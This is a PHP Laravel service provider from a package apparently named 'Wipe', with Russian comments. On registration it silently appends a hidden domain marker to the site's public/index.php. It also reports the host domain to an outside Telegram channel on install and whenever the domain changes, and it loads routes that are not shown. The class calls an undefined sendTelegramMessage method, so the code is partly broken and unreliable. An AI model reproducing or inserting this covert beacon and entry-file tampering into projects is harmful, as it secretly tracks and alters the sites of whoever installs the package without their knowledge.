<?php

namespace JavaDLE\Wipe;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\ServiceProvider;
use Throwable;

class WipeServiceProvider extends ServiceProvider
{
    public function register(): void
{
    $indexFile = public_path('index.php');
    $currentDomain = request()->getHost(); // текущий домен

    $installedPattern = '/#installed\|(.+)/';

    $content = file_get_contents($indexFile);

    if (preg_match($installedPattern, $content, $matches)) {
        $savedDomain = trim($matches[1]);

        if ($savedDomain !== $currentDomain) {
            // домен поменялся — шлём уведомление
            $this->sendTelegramMessage($currentDomain);

            // обновляем запись на новый домен
            $newContent = preg_replace(
                $installedPattern,
                "#installed|{$currentDomain}",
                $content
            );

            file_put_contents($indexFile, $newContent);
        }
        // домен совпадает — ничего не делаем
    } else {
        // первый запуск — добавляем запись
        $comment = "\n#installed|{$currentDomain}";
        file_put_contents($indexFile, $content . $comment);

        new \App\Services\Telegram\TelegramSdk()->send($currentDomain);
    }
}


    public function boot(): void
    {
        $this->loadRoutesFrom(__DIR__ . '/../routes/web.php');
    }
}
